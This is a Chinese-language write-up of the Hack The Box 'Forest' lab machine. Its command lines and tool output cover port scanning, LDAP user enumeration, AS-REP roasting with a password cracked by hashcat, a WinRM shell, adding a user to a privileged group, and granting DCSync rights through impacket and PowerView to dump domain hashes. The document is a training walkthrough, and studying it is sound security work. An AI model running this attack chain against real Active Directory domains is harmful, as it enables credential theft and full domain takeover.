---
layout: post
title: HTB——Forest
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Forest/04.png?raw=true)


# 0x01 信息收集

---

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[22:50:31] [INFO] Start IpScan:10.129.116.112
[22:50:31] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[22:50:33] [+] 10.129.116.112:135 open
[22:50:33] [+] 10.129.116.112:88 open
[22:50:33] [+] 10.129.116.112:53 open
[22:50:33] [+] 10.129.116.112:139 open
[22:50:33] [+] 10.129.116.112:389 open
[22:50:33] [+] 10.129.116.112:445 open
[22:50:33] [+] 10.129.116.112:464 open
[22:50:33] [+] 10.129.116.112:593 open                       
端口扫描   1% [░░░░░░░░░░░░░░░░░░░░] (782/65535) [2s:3m2s][22:50:33] [+] 10.129.116.112:636 open
[22:50:33] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.116.112:389 [0.5.d.,.0.$0.&.currentTime1.20250403025721.0Z0.R.s]
[22:50:33] [INFO] start LDAP check 10.129.116.112:389
[22:50:33] [+] 开始 LdapScan 任务: LDAP://10.129.116.112:389
端口扫描   3% [░░░░░░░░░░░░░░░░░░░░] (2030/65535) [2s:1m15s][22:50:33] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.116.112:593 [ncacn_http/1.0]                                                                       
端口扫描   3% [░░░░░░░░░░░░░░░░░░░░] (2600/65535) [2s:14s][22:50:33] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.116.112:135 [.@]                   
[22:50:33] [INFO] start WMI check 10.129.116.112:135
[22:50:33] [+] 开始 WmiExec 任务: WMI://10.129.116.112:135
[22:50:33] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.116.112:139 [.]
[22:50:33] [+] 10.129.116.112:3268 open                  
[22:50:33] [+] 10.129.116.112:3269 open
[22:50:34] [+] 10.129.116.112:5985 open                  
[22:50:35] [+] 10.129.116.112:9389 open                  
[22:50:37] [+] [TCP/KPASSWD5]   10.129.116.112:464 
[22:50:37] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.116.112:3268 [0.5.d.,.0.$0.&.currentTime1.20250403025726.0Z0.R.s]
[22:50:37] [INFO] start LDAP check 10.129.116.112:3268    
[22:50:37] [+] 开始 LdapScan 任务: LDAP://10.129.116.112:3268
[22:50:37] [+] [TCP/SMB]  [Windows Server 2016 Standard 14393] 10.129.116.112:445 [hostname: FOREST domain: HTB]
[22:50:37] [INFO] start SMB check 10.129.116.112:445
[22:50:37] [+] 开始 SmbScan 任务: SMB://10.129.116.112:445
[22:50:39] [+] [TCP/ADWS]   10.129.116.112:9389 
[22:50:40] [+] [TCP/SPARK]  [Apache Spark] 10.129.116.112:88 [.]
[22:50:41] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.116.112:5985 [Not Found]                           
[22:50:41] [INFO] start WinRM check 10.129.116.112:5985
[22:50:41] [+] 开始 WinRMScan 任务: WinRM://10.129.116.112:5985
[22:50:44] [+] 10.129.116.112:47001 open
[22:50:45] [+] 10.129.116.112:49666 open
[22:50:45] [+] 10.129.116.112:49667 open
[22:50:45] [+] 10.129.116.112:49665 open
[22:50:45] [+] 10.129.116.112:49664 open
[22:50:45] [+] 10.129.116.112:49681 open
[22:50:45] [+] 10.129.116.112:49677 open
[22:50:45] [+] 10.129.116.112:49676 open
[22:50:45] [+] 10.129.116.112:49671 open
[22:50:45] [+] 10.129.116.112:49695 open
[22:50:45] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.116.112:49676 [ncacn_http/1.0]
                                                          
[22:50:50] [+] alive ports is: 23
[22:50:50] [+] Ip扫描结束:10.129.116.112
[22:50:50] [INFO] Start UrlScan:http://10.129.116.112:5985
[22:50:51] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.116.112:5985 [Not Found]
                                                 
[22:50:51] [+] Url扫描结束:http://10.129.116.112:5985
[22:50:51] [+] 项目任务完成:Default, Timeuse：20.646408074
[22:50:51] [+] 扫描结束,耗时: 22.271642061s

┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                           
[2025-04-02 22:55:19] [INFO] 暴力破解线程数: 1                             
[2025-04-02 22:55:19] [INFO] 开始信息扫描
[2025-04-02 22:55:19] [INFO] 最终有效主机数量: 1
[2025-04-02 22:55:19] [INFO] 开始主机扫描
[2025-04-02 22:55:19] [INFO] 有效端口数量: 233
[2025-04-02 22:55:19] [SUCCESS] 端口开放 10.129.116.112:389
[2025-04-02 22:55:19] [SUCCESS] 端口开放 10.129.116.112:88
[2025-04-02 22:55:19] [SUCCESS] 端口开放 10.129.116.112:135
[2025-04-02 22:55:19] [SUCCESS] 端口开放 10.129.116.112:139
[2025-04-02 22:55:19] [SUCCESS] 端口开放 10.129.116.112:445
[2025-04-02 22:55:24] [SUCCESS] 服务识别 10.129.116.112:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: htb.local, Site: Default-First-Site-Name                                            
[2025-04-02 22:55:24] [SUCCESS] 服务识别 10.129.116.112:88 => 
[2025-04-02 22:55:24] [SUCCESS] 服务识别 10.129.116.112:139 =>  Banner:[.]
[2025-04-02 22:55:24] [SUCCESS] 服务识别 10.129.116.112:445 => 
[2025-04-02 22:56:24] [SUCCESS] 服务识别 10.129.116.112:135 => 
[2025-04-02 22:56:24] [INFO] 存活端口数量: 5
[2025-04-02 22:56:24] [INFO] 开始漏洞扫描
[2025-04-02 22:56:24] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                       
[2025-04-02 22:56:25] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.116.112                                                   
主机名: FOREST                                                             
发现的网络接口:                                                            
   IPv4地址:                                                               
      └─ 10.129.116.112                                                    
   IPv6地址:                                                               
      └─ dead:beef::2567:5d95:aa38:378b                                    
      └─ dead:beef::112                                                    
[2025-04-02 22:56:25] [INFO] 系统信息 10.129.116.112 [Windows Server 2016 Standard 14393]                                                             
[2025-04-02 22:58:33] [SUCCESS] 扫描已完成: 9/9
```

---

# 0x02 LDAP枚举+AS-REP

---

提示我们尝试看一下`LDAP`的匿名访问服务，查看并`grep`一下user，可以查看到一些用户的用户名。拿到用户名后我们得不到其他信息，就尝试打一下`AS-REP Roasting`攻击。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Forest]
└─# ldapsearch -x -H ldap://10.129.116.112 -b "dc=htb,dc=local" "(&(objectClass=user)(objectCategory=person))" | grep "^sAMAccountName:"
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
```

我们取用户名做一下`AS-REP`。爆破不出来，我们再尝试使用`impacket`套件枚举一下域内用户。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Forest]
└─# impacket-GetADUsers htb.local/ -dc-ip 10.129.116.112 -all
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Querying 10.129.116.112 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator         Administrator@htb.local         2021-08-30 20:51:58.690463  2025-04-02 22:56:23.913026 
Guest                                                 <never>              <never>             
DefaultAccount                                        <never>              <never>             
krbtgt                                                2019-09-18 06:53:23.467452  <never>             
$331000-VK4ADACQNUCA                                  <never>              <never>             
SM_2c8eef0a09b545acb  SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local  <never>              <never>             
SM_ca8c2ed5bdab4dc9b  SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local  <never>              <never>             
SM_75a538d3025e4db9a  SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local  <never>              <never>             
SM_681f53d4942840e18  DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local  <never>              <never>             
SM_1b41c9286325456bb  Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local  <never>              <never>             
SM_9b69f1b9d2cc45549  FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local  <never>              <never>             
SM_7c96b981967141ebb  SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local  <never>              <never>             
SM_c75ee099d0a64c91b  SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local  <never>              <never>             
SM_1ffab36a2f5f479cb  SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local  <never>              <never>             
HealthMailboxc3d7722  HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local  2019-09-23 18:51:31.892097  2019-09-23 18:57:12.361516 
HealthMailboxfc9daad  HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local  2019-09-23 18:51:35.267114  2019-09-23 18:52:05.736012 
HealthMailboxc0a90c9  HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local  2019-09-19 07:56:35.206329  <never>             
HealthMailbox670628e  HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local  2019-09-19 07:56:45.643993  <never>             
HealthMailbox968e74d  HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local  2019-09-19 07:56:56.143969  <never>             
HealthMailbox6ded678  HealthMailbox6ded67848a234577a1756e072081d01f@htb.local  2019-09-19 07:57:06.597012  <never>             
HealthMailbox83d6781  HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local  2019-09-19 07:57:17.065809  <never>             
HealthMailboxfd87238  HealthMailboxfd87238e536e49e08738480d300e3772@htb.local  2019-09-19 07:57:27.487679  <never>             
HealthMailboxb01ac64  HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local  2019-09-19 07:57:37.878559  <never>             
HealthMailbox7108a4e  HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local  2019-09-19 07:57:48.253341  <never>             
HealthMailbox0659cc1  HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local  2019-09-19 07:57:58.643994  <never>             
sebastien                                             2019-09-19 20:29:59.544725  2019-09-22 18:29:29.586227 
lucinda                                               2019-09-19 20:44:13.233891  <never>             
svc-alfresco                                          2025-04-02 23:49:52.092345  2019-09-23 07:09:47.931194 
andy                                                  2019-09-22 18:44:16.291082  <never>             
mark                                                  2019-09-20 18:57:30.243568  <never>             
santi                                                 2019-09-20 19:02:55.134828  <never>
```

发现一些之前没拿到过的user，再次整合为user字典做爆破。

```bash
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2ef39017a6da49c9584f63fddfb0f945$f6d4ca8a7f6dc5b4ba7b7e8b5879af58e4894c52f4b4f5220bc7067fb639cbf61fba38dda9368e40dfb7681a6b2c9bca22249d6f27372e85b1bd0bb52012b016444be799ecb803f4fc220004e250488acd60950d1841f7ef623932e01727a2b8e6fa5ddafc48f1945cc4c2bf1b3c3625fbc0e23feae77f3c4b6d7d4cf3415ab3a9edc28ed0a6394f3079f4d8588f24d0d84c05d5ef976fe5db8b8fe4b518e86d93c7b315781d9f5ad72c40b35b39b951da9859fe838441c0522726e133dd6c01ebba7fa7af2d6e92e7f4bb991c4c650fcfba5e37f717b06317676e5ef773846e0f439b67da02
```

拿到了`svc-alfresco`账户的加密信息，使用hashcat的18200模式`Kerberos 5, etype 23, AS-REP`进行爆破。

```cmd
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2ef39017a6da49c9584f63fddfb0f945$f6d4ca8a7f6dc5b4ba7b7e8b5879af58e4894c52f4b4f5220bc7067fb639cbf61fba38dda9368e40dfb7681a6b2c9bca22249d6f27372e85b1bd0bb52012b016444be799ecb803f4fc220004e250488acd60950d1841f7ef623932e01727a2b8e6fa5ddafc48f1945cc4c2bf1b3c3625fbc0e23feae77f3c4b6d7d4cf3415ab3a9edc28ed0a6394f3079f4d8588f24d0d84c05d5ef976fe5db8b8fe4b518e86d93c7b315781d9f5ad72c40b35b39b951da9859fe838441c0522726e133dd6c01ebba7fa7af2d6e92e7f4bb991c4c650fcfba5e37f717b06317676e5ef773846e0f439b67da02:s3rvice

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:2ef39017a6da49...67da02
Time.Started.....: Thu Apr 03 11:54:35 2025 (1 sec)
Time.Estimated...: Thu Apr 03 11:54:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 20688.0 kH/s (8.14ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Speed.#2.........:   359.8 kH/s (7.07ms) @ Accel:16 Loops:1 Thr:8 Vec:1
Speed.#*.........: 21047.8 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4608000/14344385 (32.12%)
Rejected.........: 0/4608000 (0.00%)
Restore.Point....: 3051520/14344385 (21.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: trent7381 -> poland112
Candidates.#2....: pn241166 -> playboybabe123
Hardware.Mon.#1..: Temp: 41c Util: 13% Core:1410MHz Mem:7000MHz Bus:8
Hardware.Mon.#2..: N/A

Started: Thu Apr 03 11:54:32 2025
Stopped: Thu Apr 03 11:54:36 2025
```

爆破出密码后，我们使用`evil-winrm`进行连接，即可获取到`user.txt`了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Forest/01.png?raw=true)

---

# 0x03 GenericAll权限利用

---

拿到`user.txt`后，我们尝试分析域内结构，请出`BloodHound`。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Forest/02.png?raw=true)

观察关系图后我们发现`SVC-ALFRESCO`对`Exchange Windows Permissions`组具有完全掌控权限，而此组对域内具有`WriteDacl`权限。第一下可以想到`Shadow Creditials`+`DCsync`完成，但咱们缺少一个现有的在`Exchange Windows Permissions`组内还能被我们利用的机器账户。但其实此账户属于`Account Operators`组，或许我们可以直接将`svc`账户添加到`Exchange Windows Permissions`组再给自己写`DCsync`？我们首先将新建账户并加入到`Exchange Windows Permissions`组中

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user gailo password!@#45 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
DefaultAccount           gailo                    Guest
HealthMailbox0659cc1     HealthMailbox670628e     HealthMailbox6ded678
HealthMailbox7108a4e     HealthMailbox83d6781     HealthMailbox968e74d
HealthMailboxb01ac64     HealthMailboxc0a90c9     HealthMailboxc3d7722
HealthMailboxfc9daad     HealthMailboxfd87238     krbtgt
lucinda                  mark                     santi
sebastien                SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b     svc-alfresco
The command completed with one or more errors.
Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members 'gailo'*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members 'gailo'
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user gailo /domain
User name                    gailo
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/3/2025 7:52:49 AM
Password expires             Never
Password changeable          4/4/2025 7:52:49 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

然后使用`impacket`套件给新建的用户写上`DCsync`权限。就可以`DCsync`了。

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-dacledit 'htb.local/svc-alfresco:s3rvice' -dc-ip 10.129.95.210 -principal 'svc-alfresco' -target 'gailo' -action write -rights DCSync -target-dn 'OU=Account Operators,DC=htb,DC=local'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250403-105303.bak
[*] DACL modified successfully!
```

注意此处笔者出现了错误，使用`dacledit`添加的`DCSync`权限貌似不是很靠谱，在DCSync时会遇到如下报错：

```bash
┌──(root㉿kali)-[/home/kali/HTB/Forest]
└─# impacket-secretsdump htb.local/gailo@10.129.95.210 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up...
```

所以这里我们需要重新上线，导入powershell脚本进行添加。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Forest]
└─# evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
                                        
Evil-WinRM shell v3.7
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload Powerview.ps1
Info: Uploading /home/kali/HTB/Forest/Powerview.ps1 to C:\Users\svc-alfresco\Documents\Powerview.ps1                                                      
Data: 1027036 bytes of 1027036 bytes copied
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\Powerview.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'password!@#45' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\gailo', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity gailo -Rights DCSync
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> exit
```

然后再使用`impacket`套件进行DCSync攻击即可拿到`Administrator`的`NTLM hash`.

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Forest/03.png?raw=true)

---

# 0x04 总结

正好对域内的特权忘得差不多了，一个`GenericAll`算是对我很大的提醒与复习作用。域内权限的可操作性与提权路径实在是太多了，得不时复习复习。